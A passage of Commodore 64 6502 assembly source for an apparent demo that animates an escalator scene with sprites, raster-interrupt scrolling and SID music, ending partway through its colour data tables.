        sta VIC_BASE+44 ; Sprite 5 color = light red
        lda #6
        sta VIC_BASE+45 ; Sprite 6 color = blue

; Sprite pointers
        lda #226
        sta SPR_PTR1    ; Write to $07F9 (sprite 1 pointer)
        lda #227
        sta SPR_PTR2    ; Write to $07FA (sprite 2 pointer)
        lda #228
        sta SPR_PTR3    ; Write to $07FB (sprite 3 pointer)
        lda #229
        sta SPR_PTR4    ; Write to $07FC (sprite 4 pointer)
        lda #230
        sta SPR_PTR5    ; Write to $07FD (sprite 5 pointer)
        lda #231
        sta SPR_PTR6    ; Write to $07FE (sprite 6 pointer)

; Draw and color background screen
        ldx #$0
loop1:
        lda chars,x
        sta $0400,x

        lda colors,x
        sta $d800,x

	lda chars+200,x
        sta $0400+200,x

        lda colors+200,x
        sta $d800+200,x

	lda chars+400,x
        sta $0400+400,x

        lda colors+400,x
        sta $d800+400,x

	lda chars+600,x
        sta $0400+600,x

        lda colors+600,x
        sta $d800+600,x

	lda chars+800,x
        sta $0400+800,x

        lda colors+800,x
        sta $d800+800,x

        inx
        cpx #200         
        bne loop1

; ================================================================
; SETUP IRQ INTERRUPT SYSTEM
; ================================================================
        sei                   ; Set Interrupt Disable Flag (disable IRQ)
        
        ; Set custom IRQ vector
        lda #<IRQRoutine
        sta $0314
        lda #>IRQRoutine
        sta $0315

        lda #$7f              ; 127 = %01111111 (binary mask to clear MSB)
        sta $dc0d             ; Disable CIA 1 IRQ interrupts (timer A system interrupt)
        sta $dd0d             ; Disable CIA 2 NMI interrupts
        
        lda $dc0d             ; Clear any pending IRQ from CIA 1 (reading clears)
        lda $dd0d             ; Clear any pending NMI from CIA 2 (reading clears)

        lda #$00              ; First raster interrupt at line 0
        sta $d012             ; Load value into raster register
        sta $fb               ; Horizontal scroll counter variable (page 0)
        
        lda #$1b              ; 27 decimal = %00011011
        sta $d011             ; Clear MSB of raster (bit 8 of $d012-$d011)
        
        lda #$01
        sta $d01a             ; Enable raster interrupt

; ================================================================
; INITIALIZE SID MUSIC
; ================================================================
        lda #$00              ; Clear A register
        jsr $1000             ; Initialize music at $1000

        cli                   ; Clear Interrupt Disable Flag (enable IRQ)

        ; Setup NMI vector to disable RESTORE key
        ldx #<NMIRoutine      ; Load address $fec1 into NMINV vector ($0318-$0319)
        ldy #>NMIRoutine      ; This points to RTI instruction of default NMI handler
        stx $0318             ; This trick effectively disables RUN STOP + RESTORE
        sty $0319             ; preventing user from exiting the program

; ================================================================
; MAIN ANIMATION LOOP
; ================================================================
MainLoop:
        ldx #0  
animation_loop:
        ; Copy table 1 (escalator_1)
        lda #<escalator_1     ; Load address of first table
        sta src_ptr
        lda #>escalator_1
        sta src_ptr+1

        lda s_table,x         ; Get sprite pointer from table
        sta SPR_PTR           ; Write to $07F8 (sprite 0 pointer)
        inx
    
        jsr copy_table        ; Copy the table
        jsr wait              ; Wait for timing
        
        ; Copy table 2 (escalator_2)
        lda #<escalator_2
        sta src_ptr
        lda #>escalator_2
        sta src_ptr+1

        lda s_table,x
        sta SPR_PTR
        inx
      
        jsr copy_table
        jsr wait 

        ; Copy table 3 (escalator_3)
        lda #<escalator_3
        sta src_ptr
        lda #>escalator_3
        sta src_ptr+1

        lda s_table,x
        sta SPR_PTR
        inx
   
        jsr copy_table
        jsr wait 

        ; Copy table 4 (escalator_4)
        lda #<escalator_4
        sta src_ptr
        lda #>escalator_4
        sta src_ptr+1

        lda s_table,x
        sta SPR_PTR
        inx

        jsr copy_table
        jsr wait 

        ; Copy table 5 (escalator_5)
        lda #<escalator_5
        sta src_ptr
        lda #>escalator_5
        sta src_ptr+1

        lda s_table,x
        sta SPR_PTR
        inx
       
        jsr copy_table
        jsr wait 

        ; Copy table 6 (escalator_6)
        lda #<escalator_6
        sta src_ptr
        lda #>escalator_6
        sta src_ptr+1

        lda s_table,x
        sta SPR_PTR
        inx
       
        jsr copy_table
        jsr wait 

        ; Copy table 7 (escalator_7)
        lda #<escalator_7
        sta src_ptr
        lda #>escalator_7
        sta src_ptr+1

        lda s_table,x
        sta SPR_PTR
        inx
    
        jsr copy_table
        jsr wait 

        ; Copy table 8 (escalator_8)
        lda #<escalator_8
        sta src_ptr
        lda #>escalator_8
        sta src_ptr+1

        lda s_table,x
        sta SPR_PTR
        inx
          
        jsr copy_table
        jsr wait 

        ; Copy table 9 (escalator_9)
        lda #<escalator_9
        sta src_ptr
        lda #>escalator_9
        sta src_ptr+1

        lda s_table,x
        sta SPR_PTR
        inx
          
        jsr copy_table
        jsr wait 

        ; Copy table 10 (escalator_10)
        lda #<escalator_10
        sta src_ptr
        lda #>escalator_10
        sta src_ptr+1

        lda s_table,x
        sta SPR_PTR
        inx
          
        jsr copy_table
        jsr wait 

        jmp MainLoop          ; Loop forever
       

; ================================================================
; SUBROUTINE: copy_table
; Copies a 13x13 table to the escalator area on screen
; (color RAM at row 12, column 1)
; ================================================================
copy_table:
        txa                   ; Save X
        pha
        tya                   ; Save Y
        pha

        ; Calculate screen address for row 13, column 1
        lda #<($d800+12*40)   ; Low byte of color RAM address
        sta dest_ptr
        lda #>($d800+12*40)   ; High byte of color RAM address
        sta dest_ptr+1
        
        ldx #0                ; Row counter (0-12)
        
row_loop:
        ldy #0                ; Column counter (0-12)
        
col_loop:
        ; Copy one byte from table to color RAM
        lda (src_ptr),y       ; Read from table
        sta (dest_ptr),y      ; Write to color RAM
        
        iny                   ; Next column
        cpy #13               ; Check if we've reached 13 columns
        bne col_loop
        
        ; Advance to next row in table
        clc
        lda src_ptr           ; Add 13 to source pointer
        adc #13
        sta src_ptr
        lda src_ptr+1
        adc #0
        sta src_ptr+1
        
        ; Advance to next row on screen
        clc
        lda dest_ptr          ; Add 40 to destination pointer
        adc #40               ; (screen row width)
        sta dest_ptr
        lda dest_ptr+1
        adc #0
        sta dest_ptr+1
        
        inx                   ; Next row
        cpx #13               ; Check if we've reached 13 rows
        bne row_loop   

        pla                   ; Restore Y
        tay
        pla                   ; Restore X
        tax
        rts

; ================================================================
; SUBROUTINE: wait
; Delay routine for animation timing
; ================================================================
wait:
        txa                   ; Save X
        pha
        tya                   ; Save Y
        pha

        ldy #50
Delay1: ldx #0
Delay2: dex
        bne Delay2
        dey
        bne Delay1

        pla                   ; Restore Y
        tay
        pla                   ; Restore X
        tax
        rts

; ================================================================
; SUBROUTINE: LoadSprites
; Copies sprite data from ROM to sprite memory locations
; ================================================================
LoadSprites:
        ldx #0
LoadLoop:
        ; Flag sprites (0-9)
        lda sprite0_data,x
        sta $02C0,x     ; $02C0 = 704 (sprite pointer 11)

        lda sprite1_data,x
        sta $0340,x     ; $0340 = 832 (sprite pointer 13)

        lda sprite2_data,x
        sta $0380,x     ; $0380 = 896 (sprite pointer 14)

        lda sprite3_data,x
        sta $03C0,x     ; $03C0 = 960 (sprite pointer 15)

        lda sprite4_data,x
        sta $3700,x     ; $3700 = 14080 (sprite pointer 220)

        lda sprite5_data,x
        sta $3740,x     ; $3740 = 14144 (sprite pointer 221)

        lda sprite6_data,x
        sta $3780,x     ; $3780 = 14208 (sprite pointer 222)

        lda sprite7_data,x
        sta $37c0,x     ; $37c0 = 14272 (sprite pointer 223)

        lda sprite8_data,x
        sta $3800,x     ; $3800 = 14336 (sprite pointer 224)

        lda sprite9_data,x
        sta $3840,x     ; $3840 = 14400 (sprite pointer 225)

        ; Standing person sprites (10-12)
        lda sprite10_data,x
        sta $3880,x     ; $3880 = 14464 (sprite pointer 226)

        lda sprite11_data,x
        sta $38c0,x     ; $38c0 = 14528 (sprite pointer 227)

        lda sprite12_data,x
        sta $3900,x     ; $3900 = 14592 (sprite pointer 228)

        ; Sitting person sprites (13-15)
        lda sprite13_data,x
        sta $3940,x     ; $3940 = 14656 (sprite pointer 229)

        lda sprite14_data,x
        sta $3980,x     ; $3980 = 14720 (sprite pointer 230)

        lda sprite15_data,x
        sta $39c0,x     ; $39c0 = 14784 (sprite pointer 231)

        inx
        cpx #63
        bne LoadLoop
        rts

; ================================================================
; IRQ ROUTINE - Main raster interrupt handler
; ================================================================
IRQRoutine:
        asl $d019             ; Acknowledge raster IRQ

; Modified with 3 separate IRQ handlers:
; IRQ1: Handles horizontal scroll (changes only $D016)
; IRQ2: Resets scroll at bottom of scroll area
; IRQ3: Called during vertical blank to move characters

        lda $d012             ; Current raster line
        cmp #$00
        beq RasterTop         ; Top raster - scroll area
        cmp #rast_1
        beq RasterBottom      ; Bottom raster - reset scroll
        cmp #rast_2
        beq DoMoveChars       ; Move characters raster

        jmp testTimerAInterrupt


; Top of screen - apply horizontal scroll
RasterTop:
        ldx $fb               ; Load scroll counter
        inx                   ; Increment counter
        cpx #$08              ; Reached 8? (8 pixels = full character)
        bne scrolling         ; If not at end, continue scrolling
        ldx #$00              ; Reset counter if at end
scrolling:
        lda scrollValue,x     ; Read scroll value from table
        sta $d016             ; Set horizontal scroll (bits 0-2 of $d016)
        stx $fb               ; Save counter

        lda #rast_1	      ; Next IRQ at line rast_1
        sta $d012
        jmp testTimerAInterrupt


; Bottom of scroll area - reset to no scroll
RasterBottom:
        lda #$00              ; %00000000 (38 column mode)
        sta $d016             ; Reset to default (no horizontal scroll)

        lda #rast_2           ; Next IRQ at line rast_2
        sta $d012
        jmp testTimerAInterrupt

; Move characters horizontally
DoMoveChars:
        jsr moveCharacters    ; Shift characters

        lda #$00              ; Next IRQ at line 0
        sta $d012
        jmp testTimerAInterrupt


; Check for system timer interrupt and call music player
testTimerAInterrupt:
        lda $dc0d             ; Check if CIA 1 Timer A interrupt occurred
        and #$01              ; Check if bit 0 (LSB) is set
        beq exitPullStack     ; If no Timer A interrupt, exit normally

; Call SID music player
        jsr $1003             ; Call music playback routine at $1003
        jmp $ea31             ; Jump to system IRQ handler for keyboard scan, etc.
        
exitPullStack:
        pla                   ; These 6 instructions are equivalent to
        tay                   ; JMP $ea81 or JMP $febc
        pla                   ; Pull registers Y, X, A from stack + RTI
        tax                   ; Push of the 3 data registers is done by
        pla                   ; the IRQ main routine at ROM $ff48
        rti                   ; Return from interrupt



; ================================================================
; SUBROUTINE: moveCharacters
; Shifts characters one position to the right (circular shift)
; Only moves the first 10 rows of the screen
; ================================================================
moveCharacters:
        ; Save A and X
        pha
        txa
        pha
        
        ; Move only first 10 rows
        ldx #$00        ; Row 0
        
moveRow:
        ; Get base address of row from precomputed table
        lda screenAddrLo,x
        sta $fd
        lda screenAddrHi,x
        sta $fe
        
        ; Save character at last position (column 39)
        ldy #39
        lda ($fd),y
        pha
        
        ; Shift characters from right to left
shiftLoop:
        dey
        lda ($fd),y
        iny
        sta ($fd),y
        dey
        bpl shiftLoop
        
        ; Put saved character in first position
        pla
        ldy #$00
        sta ($fd),y


; Process color RAM the same way
        lda colorAddrLo,x
        sta $fd
        lda colorAddrHi,x
        sta $fe

        ldy #39
        lda ($fd),y
        pha
shiftLoopCol:
        dey
        lda ($fd),y
        iny
        sta ($fd),y
        dey
        bpl shiftLoopCol

        pla
        ldy #0
        sta ($fd),y
        
        ; Next row
        inx
        cpx #10         ; Only first 10 rows
        bne moveRow
        
        ; Restore registers
        pla
        tax
        pla
        rts

; ================================================================
; DATA SECTION
; ================================================================

; Precomputed addresses for screen memory rows
screenAddrLo:
        .byte <($0400+0*40), <($0400+1*40), <($0400+2*40), <($0400+3*40)
        .byte <($0400+4*40), <($0400+5*40), <($0400+6*40), <($0400+7*40)
        .byte <($0400+8*40), <($0400+9*40)

screenAddrHi:
        .byte >($0400+0*40), >($0400+1*40), >($0400+2*40), >($0400+3*40)
        .byte >($0400+4*40), >($0400+5*40), >($0400+6*40), >($0400+7*40)
        .byte >($0400+8*40), >($0400+9*40)

; Precomputed addresses for color RAM rows
colorAddrLo:
        .byte <($d800+0*40), <($d800+1*40), <($d800+2*40), <($d800+3*40)
        .byte <($d800+4*40), <($d800+5*40), <($d800+6*40), <($d800+7*40)
        .byte <($d800+8*40), <($d800+9*40)

colorAddrHi:
        .byte >($d800+0*40), >($d800+1*40), >($d800+2*40), >($d800+3*40)
        .byte >($d800+4*40), >($d800+5*40), >($d800+6*40), >($d800+7*40)
        .byte >($d800+8*40), >($d800+9*40)

; Table of scroll values for pixel scrolling (0 to 7, rightward movement)
scrollValue:
        .byte 0,1,2,3,4,5,6,7

; Sprite pointer table (values for escalator animation frames)
s_table:
        .byte 11,13,14,15,220,221,222,223,224,225

; Text strings in PETSCII format
Text1:
        ; ""trapped between nowhere and forever...""
        .byte $14   ; t
        .byte $12   ; r
        .byte $01   ; a
        .byte $10   ; p
        .byte $10   ; p
        .byte $05   ; e
        .byte $04   ; d
        .byte 32    ; space
        .byte $02   ; b
        .byte $05   ; e
        .byte $14   ; t
        .byte $17   ; w
        .byte $05   ; e
        .byte $05   ; e
        .byte $0E   ; n
        .byte 32    ; space
        .byte $0E   ; n
        .byte $0F   ; o
        .byte $17   ; w
        .byte $08   ; h
        .byte $05   ; e
        .byte $12   ; r
        .byte $05   ; e
        .byte 32    ; space
        .byte $01   ; a
        .byte $0E   ; n
        .byte $04   ; d
        .byte 32    ; space
        .byte $06   ; f
        .byte $0F   ; o
        .byte $12   ; r
        .byte $05   ; e
        .byte $16   ; v
        .byte $05   ; e
        .byte $12   ; r
        .byte 46    ; .
        .byte 46    ; .
        .byte 46    ; .
        .byte 0     ; String terminator

Text2:
        ; ""with no escape.""
        .byte $17   ; w
        .byte $09   ; i
        .byte $14   ; t
        .byte $08   ; h
        .byte 32    ; space
        .byte $0E   ; n
        .byte $0F   ; o
        .byte 32    ; space
        .byte $05   ; e
        .byte $13   ; s
        .byte $03   ; c
        .byte $01   ; a
        .byte $10   ; p
        .byte $05   ; e
        .byte 46    ; .
        .byte 0     ; String terminator


; ================================================================
; DATA LOADED FROM $1000 ONWARDS
; ================================================================
* = $1000

; SID music data (binary SID file with header stripped)
         .binary ""Beli_jablane_FINAL.sid"", $7e  ; Load music data at $1000, skip $7e byte header
	
; Background screen character data (1000 bytes)
chars:
	.byte $6f,$6f,$6f,$6f,$6f,$e3,$f7,$f8,$62,$79,$6f,$6f,$6f,$6f,$6f,$6f
	.byte $6f,$6f,$6f,$6f,$6f,$6f,$6f,$6f,$6f,$6f,$6f,$6f,$6f,$6f,$6f,$6f
	.byte $6f,$6f,$6f,$6f,$6f,$6f,$20,$6f,$e4,$e4,$e4,$e4,$e4,$e4,$e4,$e4
	.byte $e4,$e4,$e4,$e4,$e4,$e4,$e4,$e4,$e4,$e4,$e4,$e4,$e4,$e4,$e4,$e4
	.byte $e4,$e4,$e4,$e4,$e4,$e4,$e4,$e4,$e4,$e4,$e4,$e4,$e4,$e4,$20,$a0
	.byte $e4,$e4,$e4,$e4,$e4,$e4,$e4,$e4,$e4,$e4,$e4,$e4,$e4,$e4,$e4,$e4
	.byte $e4,$e4,$e4,$e4,$e4,$e4,$e4,$e4,$e4,$e4,$e4,$e4,$e4,$e4,$e4,$e4
	.byte $e4,$e4,$e4,$e4,$e4,$e4,$20,$e4,$a0,$dd,$a0,$dd,$a0,$dd,$dd,$e3
	.byte $dd,$dd,$a0,$dd,$dd,$a0,$dd,$dd,$a0,$dd,$c2,$a0,$dd,$dd,$a0,$dd
	.byte $dd,$a0,$c2,$dd,$a0,$dd,$dd,$62,$dd,$a0,$a0,$dd,$a0,$dd,$bd,$dd
	.byte $af,$dd,$a0,$ca,$c3,$cb,$ca,$c3,$cb,$ca,$c3,$cb,$ca,$c3,$cb,$ca
	.byte $c3,$cb,$ca,$c3,$cb,$ca,$c3,$cb,$ca,$c3,$cb,$ca,$c3,$cb,$ca,$c3
	.byte $cb,$a0,$a0,$dd,$af,$dd,$bd,$dd,$e3,$dd,$a0,$a0,$a0,$a0,$a0,$a0
	.byte $a0,$a0,$a0,$a0,$a0,$88,$8f,$8b,$95,$94,$8f,$a0,$86,$8f,$92,$83
	.byte $85,$a0,$a0,$a0,$a0,$a0,$a0,$a0,$a0,$a0,$a0,$dd,$e3,$dd,$bd,$dd
	.byte $af,$dd,$a0,$a0,$a0,$a0,$a0,$a0,$a0,$a0,$a0,$a0,$a0,$a0,$a0,$a0
	.byte $a0,$a0,$a0,$a0,$a0,$a0,$a0,$a0,$a0,$a0,$a0,$a0,$a0,$a0,$a0,$a0
	.byte $a0,$a0,$a0,$dd,$af,$dd,$bd,$dd,$c3,$cb,$a0,$a0,$a0,$a0,$a0,$a0
	.byte $a0,$a0,$a0,$a0,$a0,$a0,$a0,$a0,$a0,$a0,$a0,$a0,$a0,$a0,$a0,$a0
	.byte $a0,$a0,$a0,$a0,$a0,$a0,$a0,$a0,$a0,$a0,$a0,$ca,$c3,$cb,$62,$ca
	.byte $e2,$e2,$e2,$57,$e2,$e2,$57,$e2,$e2,$e2,$e2,$e2,$e2,$e2,$e2,$e2
	.byte $e2,$e2,$e2,$e2,$e2,$e2,$e2,$e2,$e2,$e2,$e2,$e2,$e2,$e2,$57,$e2
	.byte $e2,$57,$e2,$e2,$e2,$e2,$20,$e2,$c4,$c4,$c4,$c4,$c4,$c4,$c4,$c4
	.byte $c4,$c4,$c4,$c4,$c4,$c4,$c4,$c4,$c4,$c4,$c4,$c4,$c4,$c4,$c4,$c4
	.byte $c4,$c4,$c4,$c4,$c4,$c4,$c4,$c4,$c4,$c4,$c4,$c4,$c4,$c4,$c4,$c4
	.byte $df,$ce,$ce,$ce,$ce,$ce,$ce,$ce,$ce,$ce,$ce,$ce,$ce,$ce,$ce,$ce
	.byte $ce,$ce,$ce,$ce,$ce,$ce,$ce,$ce,$ce,$ce,$ce,$ce,$ce,$ce,$ce,$ce
	.byte $ce,$ce,$ce,$ce,$ce,$ce,$ce,$ce,$cd,$df,$20,$20,$20,$20,$20,$20
	.byte $20,$20,$20,$20,$20,$20,$20,$20,$20,$20,$20,$20,$20,$20,$20,$20
	.byte $20,$20,$20,$20,$20,$20,$20,$20,$62,$62,$62,$62,$62,$62,$62,$20
	.byte $62,$cd,$df,$20,$20,$20,$20,$20,$20,$20,$20,$20,$20,$20,$20,$20
	.byte $20,$20,$20,$20,$f0,$c0,$ee,$20,$20,$20,$20,$20,$20,$20,$20,$20
	.byte $94,$89,$83,$8b,$85,$94,$93,$20,$62,$62,$cd,$df,$20,$20,$20,$20
	.byte $20,$20,$20,$20,$20,$20,$20,$20,$20,$20,$20,$20,$dd,$bd,$dd,$20
	.byte $20,$20,$20,$20,$20,$20,$20,$20,$f5,$f4,$a0,$a0,$a0,$ea,$f6,$20
	.byte $62,$62,$62,$cd,$df,$20,$20,$20,$20,$20,$20,$20,$20,$20,$f8,$f8
	.byte $f8,$f8,$f8,$20,$dd,$bd,$dd,$20,$f8,$f8,$f8,$f8,$f8,$20,$20,$20
	.byte $f5,$f4,$20,$79,$20,$ea,$f6,$20,$62,$62,$62,$62,$cd,$df,$20,$20
	.byte $20,$20,$20,$20,$20,$6c,$c6,$c6,$c6,$c6,$c6,$7b,$ed,$c0,$fd,$6c
	.byte $c6,$c6,$c6,$c6,$c6,$7b,$20,$20,$f5,$f4,$20,$a2,$20,$ea,$f6,$20
	.byte $62,$62,$62,$62,$62,$cd,$df,$20,$20,$20,$20,$20,$20,$76,$63,$63
	.byte $63,$63,$63,$75,$20,$42,$20,$76,$63,$63,$63,$63,$63,$75,$20,$20
	.byte $f5,$f4,$cf,$e3,$d0,$ea,$f6,$20,$a0,$62,$62,$62,$62,$62,$cd,$df
	.byte $20,$20,$20,$20,$20,$20,$20,$20,$20,$20,$20,$20,$20,$71,$20,$20
	.byte $20,$20,$20,$20,$20,$20,$20,$20,$f5,$f4,$f4,$a0,$e7,$ea,$f6,$20
	.byte $cd,$a0,$62,$62,$62,$62,$62,$cd,$df,$20,$20,$20,$20,$20,$20,$20
	.byte $20,$20,$20,$20,$20,$20,$20,$20,$20,$20,$20,$20,$20,$20,$20,$20
	.byte $f5,$f4,$f4,$a0,$e7,$e7,$f6,$20,$a0,$cd,$a0,$62,$62,$62,$62,$62
	.byte $cd,$df,$20,$20,$20,$20,$20,$20,$20,$20,$20,$20,$20,$20,$20,$20
	.byte $20,$20,$20,$20,$20,$20,$20,$20,$20,$20,$20,$20,$20,$20,$20,$20
	.byte $a0,$a0,$cd,$a0,$62,$62,$62,$62,$62,$cd,$df,$20,$20,$20,$20,$20
	.byte $20,$20,$20,$20,$20,$20,$20,$20,$20,$20,$20,$20,$20,$20,$20,$20
	.byte $20,$20,$20,$20,$20,$20,$20,$20,$5f,$a0,$a0,$cd,$a0,$62,$62,$62
	.byte $62,$62,$cd,$df,$20,$20,$e9,$20,$e9,$20,$e9,$20,$e9,$20,$e9,$20
	.byte $e9,$20,$e9,$20,$e9,$20,$20,$20,$20,$20,$20,$79,$79,$20,$20,$20
	.byte $20,$5f,$a0,$a0,$cd,$a0,$62,$62,$62,$62,$62,$cd,$df,$20,$a0,$dd
	.byte $fb,$dd,$a0,$dd,$fb,$dd,$a0,$dd,$fb,$dd,$a0,$dd,$fb,$20,$20,$20
	.byte $20,$20,$20,$a0,$d1,$20,$20,$20,$20,$20,$5f,$a0,$a0,$cd,$a0,$62
	.byte $62,$62,$62,$62,$cd,$df,$a0,$dd,$a0,$dd,$a0,$dd,$a0,$dd,$a0,$dd
	.byte $a0,$dd,$a0,$dd,$a0,$20,$20,$20,$20,$20,$20,$a0,$a0,$20,$20,$20
	.byte $20,$20,$20,$5f,$a0,$a0,$cd,$a0,$62,$62,$62,$62,$62,$cd,$a0,$20
	.byte $a0,$20,$a0,$20,$a0,$20,$a0,$20,$a0,$20,$a0,$20,$a0,$20,$20,$20
	.byte $20,$20,$20,$e1,$61,$20,$20,$20

; Background screen color data (1000 bytes)
colors:
    .byte $0b,$0b,$0b,$0b,$0b,$0b,$0b,$0b,$0b,$0b,$0b,$0b,$0b,$0b,$0b,$0b
	.byte $0b,$0b,$0b,$0b,$0b,$0b,$0b,$0b,$0b,$0b,$0b,$0b,$0b,$0b,$0b,$0b
	.byte $0b,$0b,$0b,$0b,$0b,$0b,$0b,$0b,$02,$02,$02,$02,$02,$02,$02,$02
	.byte $02,$02,$02,$02,$02,$02,$02,$02,$02,$02,$02,$02,$02,$02,$02,$02
	.byte $02,$02,$02,$02,$02,$02,$02,$02,$02,$02,$02,$02,$02,$02,$02,$02
	.byte $02,$02,$02,$02,$02,$02,$02,$02,$02,$02,$02,$02,$02,$02,$02,$02
	.byte $02,$02,$02,$02,$02,$02,$02,$02,$02,$02,$02,$02,$02,$02,$02,$02
	.byte $02,$02,$02,$02,$02,$02,$02,$02,$0c,$02,$02,$02,$07,$02,$02,$0c
	.byte $02,$02,$07,$02,$02,$07,$02,$02,$0c,$02,$02,$07,$02,$02,$07,$02
	.byte $02,$07,$02,$02,$07,$02,$02,$0c,$02,$02,$02,$02,$0c,$02,$0b,$02
	.byte $0c,$02,$02,$02,$02,$02,$02,$02,$02,$02,$02,$02,$02,$02,$02,$02
	.byte $02,$02,$02,$02,$02,$02,$02,$02,$02,$02,$02,$02,$02,$02,$02,$02
	.byte $02,$02,$02,$02,$0c,$02,$0b,$02,$0c,$02,$02,$02,$02,$02,$02,$02
	.byte $02,$02,$02,$02,$02,$02,$02,$02,$02,$02,$02,$02,$02,$02,$02,$02
	.byte $02,$02,$02,$02,$02,$02,$02,$02,$02,$02,$02,$02,$0c,$02,$0b,$02
	.byte $0c,$02,$0b,$0b,$0b,$0b,$0b,$0b,$0b,$0b,$0b,$0b,$02,$02,$02,$02
	.byte $02,$02,$02,$02,$02,$02,$02,$02,$02,$02,$0b,$0b,$0b,$0b,$0b,$0b
	.byte $0b,$0b,$0b,$02,$0c,$02,$0b,$02,$02,$02,$06,$06,$06,$06,$06,$06
	.byte $06,$06,$06,$06,$06,$06,$06,$06,$06,$06,$06,$06,$06,$06,$06,$06
	.byte $06,$06,$06,$06,$06,$06,$06,$06,$06,$06,$06,$02,$02,$02,$0c,$02
	.byte $06,$06,$0b,$0b,$0b,$0b,$0b,$0b,$06,$06,$06,$06,$06,$06,$06,$06
	.byte $06,$06,$06,$06,$06,$06,$06,$06,$06,$06,$06,$06,$06,$0b,$0b,$0b
	.byte $0b,$0b,$0b,$06,$06,$06,$02,$06,$0b,$0b,$0b,$0b,$0b,$0b,$0b,$0b
	.byte $0b,$0b,$0b,$0b,$0b,$0b,$0b,$0b,$0b,$0b,$0b,$0b,$0b,$0b,$0b,$0b
	.byte $0b,$0b,$0b,$0b,$0b,$0b,$0b,$0b,$0b,$0b,$0b,$0b,$0b,$0b,$0b,$0b
	.byte $06,$07,$07,$07,$07,$07,$07,$07,$07,$07,$07,$07,$07,$07,$07,$07
	.byte $07,$07,$07,$07,$07,$07,$07,$07,$07,$07,$07,$07,$07,$07,$07,$07
	.byte $07,$07,$07,$07,$07,$07,$07,$07,$06,$06,$0d,$0d,$0d,$0d,$0d,$0d
	.byte $0d,$0d,$0d,$0d,$0d,$0d,$0d,$0d,$0d,$0d,$0d,$0d,$0d,$0d,$0d,$0d
	.byte $0d,$0d,$0d,$0d,$0d,$0d,$0d,$0d,$0c,$0c,$0c,$0c,$0c,$0c,$0c,$0f
	.byte $03,$06,$06,$0d,$0b,$0b,$0b,$0b,$04,$04,$04,$04,$04,$0b,$0b,$0b
	.byte $0b,$0b,$0b,$0b,$0b,$0c,$0f,$0d,$0d,$0d,$0d,$0d,$0d,$0d,$0d,$0d
	.byte $0d,$0d,$0d,$0d,$0d,$0d,$0d,$0f,$07,$07,$06,$06,$0d,$0b,$0b,$0b
	.byte $04,$04,$04,$04,$04,$0b,$0b,$0b,$0b,$0b,$0b,$0d,$0b,$01,$0f,$0d
	.byte $0d,$0d,$0d,$0d,$0d,$0d,$0d,$0d,$03,$03,$03,$03,$03,$03,$03,$0f
	.byte $05,$05,$05,$06,$06,$0d,$0b,$0b,$0b,$04,$04,$04,$0b,$0b,$08,$08
	.byte $08,$08,$08,$0d,$0b,$01,$0f,$0d,$08,$08,$08,$08,$08,$0d,$0d,$0d
	.byte $03,$03,$0d,$06,$0d,$03,$03,$0f,$04,$04,$04,$04,$06,$06,$0d,$0b
	.byte $0b,$04,$04,$04,$0b,$08,$08,$08,$08,$08,$08,$08,$0b,$0c,$0f,$08
	.byte $08,$08,$08,$08,$08,$08,$0d,$0d,$03,$03,$0d,$0a,$0d,$03,$03,$0f
	.byte $02,$02,$02,$02,$02,$06,$06,$0d,$0b,$04,$04,$0b,$0b,$09,$09,$09
	.byte $09,$09,$09,$09,$0b,$0b,$0b,$09,$09,$09,$09,$09,$09,$09,$0d,$0d
	.byte $0c,$0c,$0c,$0c,$0c,$0c,$0c,$0f,$06,$01,$01,$01,$01,$01,$06,$06
	.byte $0d,$0b,$04,$0b,$0b,$08,$08,$08,$08,$08,$08,$0b,$0b,$0b,$0b,$08
	.byte $08,$08,$08,$08,$08,$08,$0d,$0d,$0c,$0c,$0c,$0c,$0c,$0c,$0c,$0f
	.byte $06,$06,$08,$08,$08,$08,$08,$06,$06,$0d,$0b,$0b,$0b,$08,$08,$08
	.byte $08,$08,$08,$0b,$0b,$0c,$0c,$08,$08,$08,$08,$08,$08,$08,$08,$0f
	.byte $0c,$0c,$0c,$0c,$0c,$0c,$0c,$0f,$06,$06,$06,$09,$09,$09,$09,$09
	.byte $06,$06,$0d,$0b,$0b,$08,$08,$08,$08,$08,$08,$0d,$0b,$0c,$0c,$08
	.byte $08,$08,$08,$08,$08,$08,$0f,$0f,$0f,$0f,$0f,$09,$09,$09,$0d,$0d
	.byte $06,$06,$06,$06,$0a,$0a,$0a,$0a,$0a,$06,$06,$0d,$0b,$0f,$0f,$0f
	.byte $0f,$0f,$0f,$0f,$0f,$0f,$0f,$0f,$0f,$0f,$0f,$0f,$0f,$0f,$08,$0f
	.byte $0f,$0f,$0d,$09,$09,$09,$0d,$0d,$06,$06,$06,$06,$06,$0d,$0d,$0d
	.byte $0d,$0d,$06,$06,$0b,$09,$0c,$03,$0f,$0f,$0c,$0f,$0f,$0f,$0c,$0f
	.byte $0f,$0f,$0c,$0f,$0f,$0f,$08,$08,$08,$08,$0f,$09,$08,$06,$0d,$0d
	.byte $04,$06,$06,$06,$06,$06,$0e,$0e,$0e,$0e,$0e,$06,$06,$09,$0f,$03
	.byte $0f,$03,$0f,$03,$0f,$03,$0f,$03,$0f,$03,$0f,$03,$0f,$0f,$08,$08
	.byte $08,$08,$0d,$0b,$0c,$06,$0d,$0d,$04,$04,$06,$06,$06,$06,$06,$0f
	.byte $0f,$0f,$0f,$0f,$06,$06,$0f,$03,$0f,$03,$0f,$03,$0f,$03,$0f,$03
	.byte $0f,$03,$0f,$03,$0f,$0f,$08,$08,$08,$08,$0d,$0b,$0c,$06,$0d,$0d
	.byte $04,$04,$04,$06,$06,$06,$06,$06,$0c,$0c,$0c,$0c,$0c,$06,$0f,$0f
	.byte $0f,$0f,$0f,$0f,$0f,$0f,$0f,$0f,$0f,$0f,$0f,$0f,$0f,$0f,$08,$08
	.byte $08,$08,$0d,$0b,$0f,$06,$0d,$0d

escalator_1:
        .byte $03,$06,$06,$00,$00,$00,$00,$00,$00,$00,$00,$00,$00
        .byte $07,$07,$06,$06,$00,$00,$00,$00,$00,$00,$00,$00,$00
        .byte $05,$05,$05,$06,$06,$00,$00,$00,$00,$00,$00,$00,$00
        .byte $04,$04,$04,$04,$06,$06,$00,$00,$00,$00,$00,$00,$00
        .byte $02,$02,$02,$02,$02,$06,$06,$00,$00,$00,$00,$00,$00
        .byte $06,$01,$01,$01,$01,$01,$06,$06,$00,$00,$00,$00,$00
        .byte $06,$06,$08,$08,$08,$08,$08,$06,$06,$00,$00,$00,$00
        .byte $06,$06,$06,$09,$09,$09,$09,$09,$06,$06,$00,$00,$00
        .byte $06,$06,$06,$06,$0a,$0a,$0a,$0a,$0a,$06,$06,$00,$00
